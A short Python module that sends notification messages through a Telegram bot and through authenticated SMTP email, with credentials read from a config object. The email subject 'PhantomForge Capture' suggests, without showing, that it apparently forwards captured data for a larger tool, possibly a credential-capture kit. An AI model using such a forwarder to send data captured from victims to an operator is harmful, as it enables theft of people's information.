import telegram
import smtplib
from email.mime.text import MIMEText
from src.utils import config

async def send_telegram_notification(message: str):
    bot = telegram.Bot(token=config["telegram_bot_token"])
    await bot.send_message(chat_id=config["telegram_chat_id"], text=message)

def send_email_notification(message: str):
    msg = MIMEText(message)
    msg["Subject"] = "PhantomForge Capture"
    msg["From"] = config["email_from"]
    msg["To"] = config["email_to"]

    with smtplib.SMTP(config["smtp_host"], config["smtp_port"]) as server:
        server.starttls()
        server.login(config["smtp_user"], config["smtp_password"])
        server.send_message(msg)
